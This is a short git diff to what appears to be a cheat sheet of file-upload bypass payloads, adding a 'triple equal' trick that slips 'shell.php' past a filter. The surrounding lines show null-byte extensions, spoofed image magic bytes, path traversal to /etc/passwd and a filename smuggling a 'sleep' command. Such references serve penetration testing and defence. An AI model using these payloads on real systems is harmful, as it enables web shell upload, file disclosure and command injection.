@@ -31,7 +31,7 @@ file.php.blah123jpg
 
 ### Null byte
 
-```text
+```
 file.php%00.gif
 file.php\x00.gif
 file.php%00.png
@@ -70,6 +70,13 @@ PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
 JPG: \xff\xd8\xff
 GIF: GIF87a
 GIF: GIF8
+```
+
+### Triple equal
+
+```
+/?file=shell.php    <-- Blocked
+/?file===shell.php  <-- Bypassed
 ```
 
 ### Filename Vulnerabilities:
@@ -112,4 +119,3 @@ image.png../../../../../../../etc/passwd
 ../../../tmp/lol.png
 .; sleep 10;
 ```
-
